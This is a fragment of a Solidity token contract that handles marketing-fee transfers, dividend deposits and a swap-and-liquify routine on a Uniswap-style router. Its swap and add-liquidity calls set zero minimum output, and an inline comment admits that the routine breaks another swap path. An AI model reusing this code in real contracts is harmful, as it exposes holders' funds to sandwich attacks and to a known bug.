        if(marketingAddress != address(0) && marketingAmount > 0){ TransferHelper.safeTransfer(USDT, marketingAddress, marketingAmount);  }
        if(dividendDistributor.getTotalShares() > 0){
          dividendDistributor.deposit(initialBalance-(marketingAmount));
        } else{
          TransferHelper.safeTransfer( USDT,
            marketingAddress,
            initialBalance-(marketingAmount)
          );
        }
    }


    event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity );

    function swapAndLiquifyUSDT(uint256 swapAmounts, uint256 tokens) private {
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens-(half);

        uint256 initialBalance = IERC20(USDT).balanceOf(address(this));
        swapTokensForUSDT(swapAmounts+(half)); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered
        uint256 newBalance = IERC20(USDT).balanceOf(address(this))-(initialBalance);

        addLiquidityUSDT(otherHalf, newBalance);
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }


    function addLiquidityUSDT(uint256 tokenAmount, uint256 ethAmount) private {
        uniswapRouter.addLiquidity(
            address(this),
            USDT,
            tokenAmount,
            ethAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            deadAddress,
            block.timestamp
        );

    }

    function swapTokensForUSDT(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = USDT;
        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(tokenDistributor), block.timestamp );
        uint256 initialUSDTBalance = IERC20(USDT).balanceOf(address(tokenDistributor));
        IERC20(USDT).transferFrom(
            address(tokenDistributor),
            address(this),
            initialUSDTBalance
        );
    }

}